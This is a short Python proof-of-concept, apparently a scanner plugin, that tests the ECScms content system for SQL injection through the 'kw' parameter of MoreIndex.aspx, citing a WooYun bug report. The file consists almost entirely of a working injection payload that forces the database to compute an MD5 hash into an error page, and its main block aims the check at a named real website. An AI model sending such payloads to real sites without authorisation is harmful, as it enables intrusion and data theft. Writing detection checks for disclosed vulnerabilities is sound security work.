#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:易创思ECScms 一处注入(不是同一注入点)
#Refer:http://www.wooyun.org/bugs/wooyun-2010-088844

def assign(service,arg):
    if service=="esccms":
        return True,arg 
    


def  audit(arg):
    url=arg+"MoreIndex.aspx?pkId=0&kw=a%27%20And%201=(select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))--&st=2&t=1"
    code,head,res,errcode,_=curl.curl2(url)
    if code==500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
        security_hole(url)

if __name__=="__main__":
    from dummy import *
    audit(assign('esccms','http://www.zjhzyg.net/')[1])